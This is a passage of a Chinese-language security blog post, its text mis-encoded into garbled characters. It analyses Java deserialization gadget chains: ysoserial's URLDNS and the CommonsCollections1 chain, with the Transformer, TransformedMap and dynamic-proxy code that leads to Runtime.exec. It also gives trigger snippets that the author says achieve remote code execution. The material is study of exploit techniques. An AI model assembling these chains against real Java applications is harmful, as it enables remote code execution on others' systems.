&#123;<br>            ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(<span class="hljs-keyword">new</span> FileInputStream(<span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;D:\\program\\java\\javasec\\ysoserial-master\\2.ser&quot;</span>)));<br>            ois.readObject();<br>            ois.close();<br>            System.out.println(<span class="hljs-string">&quot;URLDNS is cached&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException | ClassNotFoundException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> RuntimeException(e);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<blockquote>
<p>è§¦å‘åŸºæœ¬éƒ½å¾ˆç¨³å®šï¼Œä½†æ˜¯å†ä¸€æ¬¡ååºåˆ—åŒ–å°±ä¸ä¼šè¢« dnslog è®°å½•åˆ°ï¼Œæ¢ä¸€ä¸ªå¹³å°åˆ™åˆå¯ä»¥ï¼Œæš‚æ—¶ä¸æ¸…æ¥šæ˜¯å¦ä¸ç¼“å­˜æœ‰å…³</p>
</blockquote>
<p>ä¸Šè¾¹æ˜¯åˆ©ç”¨äº†åå°„ä¿®æ”¹å±æ€§çš„æ–¹å¼ï¼Œå†çœ‹çœ‹ä¸€å¼€å§‹å±•ç¤º ysoserial çš„ç”Ÿæˆ Payload</p>
<p>åœ¨<code>GeneratePayload</code>è°ƒç”¨ URLDNS å¯¹è±¡ä¸­çš„<code>getObject</code>æ–¹æ³•ï¼š</p>
<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">getHostAddress:</span><span class="hljs-number">84</span>, URLDNS<span class="hljs-number">$SilentURLStreamHandler</span> (ysoserial.payloads) //ç©ºå®ç°ï¼Œä¸è¯·æ±‚DNS<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">359</span>, URLStreamHandler (java.net)<br><span class="hljs-symbol">hashCode:</span><span class="hljs-number">885</span>, URL (java.net)<br><span class="hljs-symbol">hash:</span><span class="hljs-number">339</span>, HashMap (java.util)<br><span class="hljs-symbol">put:</span><span class="hljs-number">612</span>, HashMap (java.util)<br><span class="hljs-symbol">getObject:</span><span class="hljs-number">57</span>, URLDNS (ysoserial.payloads)<br><span class="hljs-symbol">main:</span><span class="hljs-number">34</span>, GeneratePayload (ysoserial)<br></code></pre></td></tr></table></figure>

<p>è°ƒç”¨ç»§æ‰¿å­ç±»çš„é‡å†™æ–¹æ³•<code>SilentURLStreamHandler.getHostAddress</code>ï¼Œè¿”å›äº† null å€¼ï¼Œå› æ­¤ä¸è§¦å‘ DNS è¯·æ±‚(å…¶ä¸­åºåˆ—åŒ–æ—¶ handler æ˜¯<strong>transient</strong>ä¿®é¥°çš„ï¼Œå› æ­¤ä¸ä¼šå­˜å‚¨åœ¨åºåˆ—åŒ–æ•°æ®ä¸­ï¼›è€Œååºåˆ—åŒ–è°ƒç”¨çš„æ—¶é»˜è®¤çš„ handlerï¼Œä¹Ÿæ²¡æœ‰é‡å†™çš„<code>getHostAddress</code>æ–¹æ³•ï¼Œä¹Ÿå°±ä¸å½±å“è¿›è¡Œ DNS è¯·æ±‚)</p>
<p>å¦å¤–è¿˜é‡å†™äº†<code>openConnection</code>æ˜¯å› ä¸ºç»§æ‰¿çš„<code>URLStreamHandler</code>æ˜¯æŠ½è±¡ç±»ï¼Œå› æ­¤å¿…é¡»é‡å†™æ‰€æœ‰(ä¹Ÿå°±ä¸€ä¸ª)æŠ½è±¡æ–¹æ³•</p>
<h2 id="CommonsCollections1"><a href="#CommonsCollections1" class="headerlink" title="CommonsCollections1"></a>CommonsCollections1</h2><h3 id="Pre"><a href="#Pre" class="headerlink" title="Pre"></a>Pre</h3><h4 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h4><blockquote>
<p>jdk1.7 &lt; 8u71</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="åˆ©ç”¨é“¾"><a href="#åˆ©ç”¨é“¾" class="headerlink" title="åˆ©ç”¨é“¾"></a>åˆ©ç”¨é“¾</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>	<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>		<span class="hljs-constructor">Map(Proxy)</span>.entry<span class="hljs-constructor">Set()</span><br>			<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">AnnotationInvocationHandler</span>.</span></span>invoke<span class="hljs-literal">()</span><br>				<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>					<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>						<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>							<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>								<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br><br></code></pre></td></tr></table></figure>

<h4 id="å…³é”®ç±»"><a href="#å…³é”®ç±»" class="headerlink" title="å…³é”®ç±»"></a>å…³é”®ç±»</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer<br>ConstantTransformer<br>InvokerTransformer<br>ChainedTransformer<br><br>HashMap<br>LazyMap<br><br>AnnotationInvocationHandler<br>Proxy<br></code></pre></td></tr></table></figure>

<h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ä½œç”¨å¾ˆç®€å•ï¼Œå¾€è¿™ä¸ªç±»çš„æ„é€ å‡½æ•°ä¼ å…¥ä¸€ä¸ª Objectï¼Œç„¶åé‡å†™çš„ transform ä¼šè¿”å›è¿™ä¸ª Objectï¼Œåé¢è¯´åˆ°çš„<code>TransformerMap.decorate(Map,Transformer,Transformer).put(&quot;a&quot;,&quot;b&quot;)</code>è¿”å›çš„å°±ä¸æ˜¯å­—ç¬¦â€a bâ€è€Œæ˜¯<code>Runtime.getRuntime()</code></p>
<h4 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h4><p>è·Ÿè¿›æºç ä¹Ÿå¾ˆå®¹æ˜“ç†è§£ï¼Œå¾€æ„é€ å‡½æ•°ä¼ å…¥æ–¹æ³•åï¼Œå‚æ•°ç±»å‹ï¼Œå‚æ•°åˆ—è¡¨ï¼Œé‡å†™çš„ transform åå°„è¿›è¡Œäº†å‘½ä»¤æ‰§è¡Œ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">InvokerTransformer</span><span class="hljs-params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iMethodName = methodName;<br>        iParamTypes = paramTypes;<br>        iArgs = args;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object input)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (input == <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>        &#125;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Class cls = input.getClass();<br>            Method method = cls.getMethod(iMethodName, iParamTypes);<br>            <span class="hljs-keyword">return</span> method.invoke(input, iArgs);<br>        &#125;<br>        <span class="hljs-keyword">catch</span>()&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h4><blockquote>
<p>å¯¼å…¥çš„æ˜¯<code>org.apache.commons.collections.Transformer</code>ï¼Œè€Œä¸æ˜¯<code>javax.xml.transform.Transformer;</code></p>
</blockquote>
<p><code>Transformer</code>æ˜¯ä¸€ä¸ªæ¥å£ï¼Œåªæœ‰ä¸€ä¸ªæ–¹æ³•<code>public Object transform(Object input);</code></p>
<p>é€šè¿‡<code>Transformer</code>æ•°ç»„å­˜å‚¨äº†<code>ConstantTransformerã€InvokerTransformer</code>å®ä¾‹å¯¹è±¡ï¼Œ<code>ConstantTransformerã€InvokerTransformer</code>å‡å®ç°äº†å¯åºåˆ—åŒ–æ¥å£ï¼Œå¹¶ä¸”éƒ½é‡å†™äº†<code>transform</code>è¿™ä¸ªæ–¹æ³•</p>
<h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p>ä¹Ÿå®ç°äº†<code>Transformer</code>æ¥å£ï¼Œå¯ä»¥å°†å¤šä¸ª<code>Transformer</code>å¯¹è±¡ä¸²åœ¨ä¸€èµ·ï¼Œ<code>ChainedTransformer</code>æ„é€ å‡½æ•°æ¥å—çš„æ˜¯<code>Transformer</code>æ•°ç»„</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ChainedTransformer</span><span class="hljs-params">(Transformer[] transformers)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>();<br>        iTransformers = transformers;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">transform</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; iTransformers.length; i++) &#123;<br>            object = iTransformers[i].transform(object);<br>        &#125;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>è´´ä¸€ä¸‹ p ç‰›çš„å›¾</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220820153609531.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="TransformerMap"><a href="#TransformerMap" class="headerlink" title="TransformerMap"></a>TransformerMap</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title">decorate</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-title">TransformedMap</span><span class="hljs-params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;<br>        <span class="hljs-keyword">super</span>(map);<br>        <span class="hljs-keyword">this</span>.keyTransformer = keyTransformer;<br>        <span class="hljs-keyword">this</span>.valueTransformer = valueTransformer;<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">put</span><span class="hljs-params">(Object key, Object value)</span> </span>&#123;<br>        key = transformKey(key);<br>        value = transformValue(value);<br>        <span class="hljs-keyword">return</span> getMap().put(key, value);<br>    &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformKey</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (keyTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> keyTransformer.transform(object);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">protected</span> Object <span class="hljs-title">transformValue</span><span class="hljs-params">(Object object)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (valueTransformer == <span class="hljs-keyword">null</span>) &#123;<br>        <span class="hljs-keyword">return</span> object;<br>    &#125;<br>    <span class="hljs-keyword">return</span> valueTransformer.transform(object);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>å¯è§è¿™ä¸ªç±»ç”¨äºä¿®é¥° Mapï¼Œä¿®é¥°è¿‡çš„ Map åœ¨æ·»åŠ æ–°å…ƒç´ çš„æ—¶å€™å¯ä»¥æ‰§è¡Œä¸€ä¸ªå›è°ƒ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java">Map decorate = TransformedMap.decorate(hm, <span class="hljs-keyword">null</span>, chainedTransformer);<span class="hljs-comment">//decorateè°ƒç”¨äº†æ„é€ å‡½æ•°ï¼Œèµ‹å€¼valueTransformerï¼ŒkeyTransformer</span><br><br><span class="hljs-comment">//1.TransformedMap.decorate.putè§¦å‘</span><br>decorate.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//éšä¾¿æ·»åŠ æ–°å…ƒç´ è§¦å‘ä¼ å…¥çš„ï¼Œä¸Šé¢æ˜¯keyTransformerä¸ºnullï¼Œé‚£ä¹ˆå°†æ˜¯è°ƒç”¨valueTransformer.transformæ–¹æ³•(put(&quot;a&quot;,&quot;b&quot;)ï¼ŒtransformKeyå’ŒtransformValueéƒ½ä¼šå»è°ƒç”¨ï¼Œå› æ­¤å¡«å…¥decorateæ–¹æ³•çš„å‚æ•°é¡ºåºä¸å½±å“æœ€ç»ˆçš„ç»“æœ)ï¼Œå³æ­¤æ—¶è§¦å‘TransformedMap.transformï¼Œè¿›è€Œè°ƒç”¨chainedTransformer.transformï¼Œæœ€åTransformeræ•°ç»„å…ƒç´ ä¸€ä¸ªä¸ªè°ƒç”¨transformæ–¹æ³•ï¼ŒæˆåŠŸRCE</span><br><br><span class="hljs-comment">//2.ä¿®æ”¹valueè§¦å‘</span><br>hashMap.put(<span class="hljs-string">&quot;a&quot;</span>,<span class="hljs-string">&quot;b&quot;</span>);<span class="hljs-comment">//å¿…é¡»è¦å…ˆå­˜å…¥éšæ„çš„é”®å€¼å¯¹ï¼Œä¸‹é¢ä¸¤è¡Œä»£ç ä¿®æ”¹è¿™ä¸ªé”®å€¼å¯¹çš„å€¼è§¦å‘</span><br>Map.Entry onlyElement = (Map.Entry) outerMap.entrySet().iterator().next();<br>onlyElement.setValue(<span class="hljs-string">&quot;c&quot;</span>);<br></code></pre></td></tr></table></figure>

<h4 id="åŠ¨æ€ä»£ç†"><a href="#åŠ¨æ€ä»£ç†" class="headerlink" title="åŠ¨æ€ä»£ç†"></a>åŠ¨æ€ä»£ç†</h4><h5 id="API"><a href="#API" class="headerlink" title="API"></a>API</h5><p>å°±åƒç ”ç©¶ååºåˆ—åŒ–ä¸€æ ·ï¼Œæˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰<code>writeObject</code>ï¼Œå†™å…¥æˆ‘ä»¬æƒ³è¦å†™å…¥çš„ï¼›åŠ¨æ€ä»£ç†é€šè¿‡ Java çš„åå°„æœºåˆ¶ï¼ŒåŠ«æŒåˆ°æ‰€æŒæœ‰çš„å§”æ‰˜ç±»å¯¹è±¡çš„ç›¸å…³æ–¹æ³•ï¼Œæˆä¸ºç‰¹å®šçš„æœåŠ¡ï¼›è¿™æ ·åšä¸€æ˜¯éš”ç»äº†ç›´æ¥è°ƒç”¨ç›¸å…³ä¸šåŠ¡ç±»çš„æ–¹æ³•æˆ–è€…æ¯”é™æ€ä»£ç†(ä»£ç å†™æ­»)æ›´åŠ çµæ´»ï¼Œé€šè¿‡ä»£ç†ç±»æ¥è°ƒç”¨ä¸€äº›æ–¹æ³•ï¼›ä¹Ÿå¯ä»¥è‡ªå®šä¹‰ä¸€äº›æ–¹æ³•åœ¨å…¶ä¸­ï¼ˆé¢å‘åˆ‡é¢ç¼–ç¨‹ï¼šåˆ‡å…¥ç‚¹å‰æ‰§è¡Œ aaaï¼Œåˆ‡å…¥ç‚¹åæ‰§è¡Œ bbbï¼‰ï¼Œè¿™æ ·å¯ä»¥å®Œæˆå¯¹ç¨‹åºçš„æ— ä¾µå…¥å¼æ‰©å±•</p>
<p><strong>Java åŠ¨æ€ä»£ç†ä¸»è¦ä½¿ç”¨åœºæ™¯ï¼š</strong></p>
<ol>
<li>ç»Ÿè®¡æ–¹æ³•æ‰§è¡Œæ‰€è€—æ—¶é—´</li>
<li>åœ¨æ–¹æ³•æ‰§è¡Œå‰åæ·»åŠ æ—¥å¿—</li>
<li>æ£€æµ‹æ–¹æ³•çš„å‚æ•°æˆ–è¿”å›å€¼</li>
<li>æ–¹æ³•è®¿é—®æƒé™æ§åˆ¶</li>
<li>æ–¹æ³•<code>Mock</code>æµ‹è¯•</li>
</ol>
<h6 id="java-lang-reflect-Proxy"><a href="#java-lang-reflect-Proxy" class="headerlink" title="java.lang.reflect.Proxy"></a>java.lang.reflect.Proxy</h6><p>ç”ŸæˆåŠ¨æ€ä»£ç†ç±»ï¼Œåˆ›å»ºä»£ç†ç±»å®ä¾‹ï¼Œå®ç°äº†<code>Serializable</code>æ¥å£</p>
<p>ä¸»è¦æ–¹æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.reflect;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Creator: yz</span><br><span class="hljs-comment"> * Date: 2020/1/15</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">java</span>.<span class="hljs-title">io</span>.<span class="hljs-title">Serializable</span> </span>&#123;<br><br>  <span class="hljs-comment">// çœå»æˆå‘˜å˜é‡å’Œéƒ¨åˆ†ç±»æ–¹æ³•...</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * è·å–åŠ¨æ€ä»£ç†å¤„ç†ç±»å¯¹è±¡</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> proxy è¿”å›è°ƒç”¨å¤„ç†ç¨‹åºçš„ä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ä»£ç†å®ä¾‹çš„è°ƒç”¨å¤„ç†ç¨‹åº</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException å¦‚æœå‚æ•°ä¸æ˜¯ä¸€ä¸ªä»£ç†å®ä¾‹</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> InvocationHandler <span class="hljs-title">getInvocationHandler</span><span class="hljs-params">(Object proxy)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces æŒ‡å®šåŠ¨æ€ä»£ç†ç±»çš„ç±»éœ€è¦å®ç°çš„æ¥å£æ•°ç»„</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> h          åŠ¨æ€ä»£ç†å¤„ç†ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> è¿”å›åŠ¨æ€ä»£ç†ç”Ÿæˆçš„ä»£ç†ç±»å®ä¾‹</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@throws</span> IllegalArgumentException ä¸æ­£ç¡®çš„å‚æ•°å¼‚å¸¸</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title">newProxyInstance</span><span class="hljs-params">(ClassLoader loader, Class&lt;?&gt;[] interfaces, InvocationHandler h)</span></span><br><span class="hljs-function">            <span class="hljs-keyword">throws</span> IllegalArgumentException </span>&#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * åˆ›å»ºåŠ¨æ€ä»£ç†ç±»</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader     å®šä¹‰ä»£ç†ç±»çš„ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> interfaces ä»£ç†ç±»è¦å®ç°çš„æ¥å£åˆ—è¡¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> ç”¨æŒ‡å®šçš„ç±»åŠ è½½å™¨å®šä¹‰çš„ä»£ç†ç±»ï¼Œå®ƒå¯ä»¥å®ç°æŒ‡å®šçš„æ¥å£</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass(ClassLoader loader, Class&lt;?&gt;... interfaces) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * æ£€æµ‹æŸä¸ªç±»æ˜¯å¦æ˜¯åŠ¨æ€ä»£ç†ç±»</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> cl è¦æµ‹è¯•çš„ç±»</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> å¦‚è¯¥ç±»ä¸ºä»£ç†ç±»ï¼Œåˆ™ä¸º trueï¼Œå¦åˆ™ä¸º false</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">boolean</span> <span class="hljs-title">isProxyClass</span><span class="hljs-params">(Class&lt;?&gt; cl)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> java.lang.reflect.Proxy.class.isAssignableFrom(cl) &amp;&amp; proxyClassCache.containsValue(cl);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * å‘æŒ‡å®šçš„ç±»åŠ è½½å™¨ä¸­å®šä¹‰ä¸€ä¸ªç±»å¯¹è±¡</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader ç±»åŠ è½½å™¨</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> name   ç±»å</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> b      ç±»å­—èŠ‚ç </span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> off    æˆªå–å¼€å§‹ä½ç½®</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> len    æˆªå–é•¿åº¦</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> JVMåˆ›å»ºçš„ç±»Classå¯¹è±¡</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">native</span> Class <span class="hljs-title">defineClass0</span><span class="hljs-params">(ClassLoader loader, String name, <span class="hljs-keyword">byte</span>[] b, <span class="hljs-keyword">int</span> off, <span class="hljs-keyword">int</span> len)</span></span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

